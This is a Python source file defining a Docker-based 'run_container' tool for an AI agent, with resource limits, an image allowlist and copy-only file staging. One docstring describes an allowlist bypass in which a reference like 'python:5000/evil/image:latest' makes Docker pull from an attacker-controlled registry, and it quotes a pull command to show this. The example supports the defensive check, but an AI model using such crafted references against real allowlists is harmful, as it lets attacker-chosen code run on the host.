"""`run_container`: anything, in any language, without touching this
machine.

`run_python_sandboxed` runs Python with no repo access; `run_script`
runs Python with full access; `run_shell` runs anything with full
access. What none of them offer is *a different environment* -- another
Python version, a compiler, a service, a dependency Sim should not
install onto the creator's laptop to try once. Docker is already
installed here and nothing used it.

The isolation is real and worth stating precisely, because it is the
opposite of every other tool in this package: the container cannot see
the repository at all. Files go in by being copied into a scratch
directory that is mounted at /work, and come back the same way. There
is no bind mount of the repo, so a container cannot modify Simorgh's
source no matter what runs inside it.

Still `irreversible`: it reaches the network when asked, it writes to
the scratch directory, and pulling an image touches the machine. What
`--read-only`, `--pids-limit`, the memory/CPU caps and the image
allowlist buy is that the *accident* is bounded -- a runaway process,
a fork bomb, a typo'd image name. A determined escape from a container
is not something this file claims to prevent.
"""

from __future__ import annotations

import shlex
import shutil
import subprocess
import time
from pathlib import Path

from simorgh.contracts.protocols import ToolContext, ToolResult

from .config import Config

# Where Docker Desktop puts the CLI when it is not on PATH (this Mac,
# 2026-09-09).
_DOCKER_FALLBACK = "/Applications/Docker.app/Contents/Resources/bin/docker"
_DAEMON_CACHE_S = 60.0


def _names_a_registry_host(image: str) -> bool:
    """True if the component before the first `/` in `image` would be
    parsed by Docker as a registry host rather than part of the image
    name.

    Docker's reference grammar treats the first `/`-separated component
    as a registry host whenever it contains a `.` or a `:`, or is
    exactly `localhost` -- otherwise it is folded into
    `docker.io/library/...`. `container_image_prefixes` assumes every
    allowed image is a plain `docker.io/library/<name>:<tag>` reference
    with no registry component, so `image.startswith("python:")`
    is meant to mean "the official python image". It does not: given
    `python:5000/evil/image:latest`, the string starts with `python:`
    and passes that check, but Docker parses `python:5000` as a
    registry host (name `python`, port `5000`) and pulls
    `evil/image:latest` from THAT host -- confirmed live, 2026-09-09
    (`docker pull python:5000/malicious/image:latest` dials
    `https://python:5000/v2/`, not Docker Hub). Anyone who can make the
    hostname `python` resolve to a registry they control (a hosts-file
    entry, DNS, a shared network) turns the allowlist into a no-op:
    the effective image is whatever they served, chosen only by them.
    Refusing any image whose first component looks like a registry
    host closes that -- none of the allowed prefixes need one."""
    if "/" not in image:
        return False
    first = image.split("/", 1)[0]
    return "." in first or ":" in first or first == "localhost"


def find_docker(configured: str = "") -> str:
    if configured:
        return configured
    found = shutil.which("docker")
    if found:
        return found
    return _DOCKER_FALLBACK if Path(_DOCKER_FALLBACK).exists() else ""


class RunContainerTool:
    name = "run_container"
    description = (
        "Run a command inside a Docker container -- a different language, runtime or tool, "
        "without installing it here. The repo is NOT visible inside; pass files via input_files."
    )
    read_only = False
    reversibility = "irreversible"
    args_schema = {
        "type": "object", "required": ["image", "command"],
        "properties": {
            "image": {"type": "string"},
            "command": {"type": ["array", "string"]},
            "network": {"type": "boolean"},
            "input_files": {"type": "array"},
            "timeout_s": {"type": "number"},
        },
    }

    def __init__(self, config: Config, *, docker_path: str | None = None, runner=None) -> None:
        self._config = config
        self._docker = find_docker(docker_path if docker_path is not None else config.container_docker_path)
        self._runner = runner or subprocess.run
        self._daemon_checked_at = 0.0
        self._daemon_ok = False

    async def run(self, args: dict, *, ctx: ToolContext) -> ToolResult:
        import asyncio

        if not self._docker:
            return ToolResult(ok=False, error="refused: no `docker` on this machine")
        image = str(args.get("image") or "").strip()
        if not image or not any(image.startswith(p) for p in self._config.container_image_prefixes):
            return ToolResult(
                ok=False,
                error=(f"refused: {image!r} is not an allowed image -- it must start with one of "
                       f"{', '.join(self._config.container_image_prefixes)}"),
            )
        if _names_a_registry_host(image):
            return ToolResult(
                ok=False,
                error=(f"refused: {image!r} names a registry host before the first `/` -- "
                       "only plain docker.io images (no custom registry) are allowed"),
            )
        command = args.get("command")
        if isinstance(command, str):
            command = shlex.split(command)
        if not isinstance(command, list) or not command or not all(isinstance(c, str) for c in command):
            return ToolResult(ok=False, error="refused: command must be a non-empty list of strings")

        if not await asyncio.to_thread(self._daemon_available):
            return ToolResult(ok=False, error="refused: the Docker daemon is not running")

        workdir = Path(self._config.repo_root) / self._config.container_scratch_dir / ctx.action_id
        try:
            workdir.mkdir(parents=True, exist_ok=True)
            refusal = self._stage_inputs(args.get("input_files") or [], workdir)
            if refusal:
                return ToolResult(ok=False, error=refusal)
        except OSError as exc:
            return ToolResult(ok=False, error=f"could not prepare the workspace: {exc!r}")

        timeout = min(float(args.get("timeout_s") or self._config.container_timeout_s),
                      self._config.container_timeout_s)
        name = f"simorgh-{ctx.action_id}"
        argv = [
            self._docker, "run", "--rm", "--name", name,
            "--network", "bridge" if args.get("network") else "none",
            "--memory", f"{self._config.container_memory_mb}m",
            "--cpus", str(self._config.container_cpus),
            "--pids-limit", "256",
            "--read-only", "--tmpfs", "/tmp",
            "-v", f"{workdir}:/work", "-w", "/work",
            image, *command,
        ]
        start = time.monotonic()
        try:
            completed = await asyncio.to_thread(
                self._runner, argv, capture_output=True, text=True,
                timeout=timeout, stdin=subprocess.DEVNULL)
        except subprocess.TimeoutExpired:
            # A timeout kills the *process*, not the container: without
            # this, the work keeps running with nobody watching. Same
            # lesson as the hung MCP server (mcp.py, 2026-09-08).
            await asyncio.to_thread(self._kill, name)
            return ToolResult(ok=False, error="timeout",
                              metadata={"duration_s": time.monotonic() - start, "container": name})
        except OSError as exc:
            return ToolResult(ok=False, error=f"could not run docker: {exc!r}")

        cap = self._config.container_output_max_chars
        produced = sorted(p.name for p in workdir.iterdir() if p.is_file())
        ok = completed.returncode == 0
        output = (completed.stdout or "")[-cap:]
        if produced:
            output += f"\n\nfiles in the container workspace: {', '.join(produced[:20])}"
        return ToolResult(
            ok=ok, output=output,
            error=None if ok else f"exit_code={completed.returncode}",
            metadata={"stderr": (completed.stderr or "")[-cap:], "exit_code": completed.returncode,
                      "image": image, "duration_s": time.monotonic() - start,
                      "workspace": str(workdir), "files": produced},
        )

    def _stage_inputs(self, names, workdir: Path) -> str:
        """Copy repo files the caller named into the container's
        workspace. Copies, never a mount: a container that could write
        back into the repo would make every write-scope rule advisory."""
        from . import pathsafety

        for name in names:
            resolved, refusal = pathsafety.resolve_safe_path(
                Path(self._config.repo_root), str(name),
                readable_roots=self._config.readable_roots)
            if refusal:
                return refusal
            if not resolved.is_file():
                return f"refused: {name!r} is not a file"
            shutil.copy2(resolved, workdir / resolved.name)
        return ""

    def _daemon_available(self) -> bool:
        now = time.monotonic()
        if now - self._daemon_checked_at < _DAEMON_CACHE_S:
            return self._daemon_ok
        try:
            completed = self._runner(
                [self._docker, "info", "--format", "{{.ServerVersion}}"],
                capture_output=True, text=True, timeout=15, stdin=subprocess.DEVNULL)
            self._daemon_ok = completed.returncode == 0
        except (OSError, subprocess.TimeoutExpired):
            self._daemon_ok = False
        self._daemon_checked_at = now
        return self._daemon_ok

    def _kill(self, name: str) -> None:
        for argv in ([self._docker, "kill", name], [self._docker, "rm", "-f", name]):
            try:
                self._runner(argv, capture_output=True, text=True, timeout=15, stdin=subprocess.DEVNULL)
            except (OSError, subprocess.TimeoutExpired):
                pass
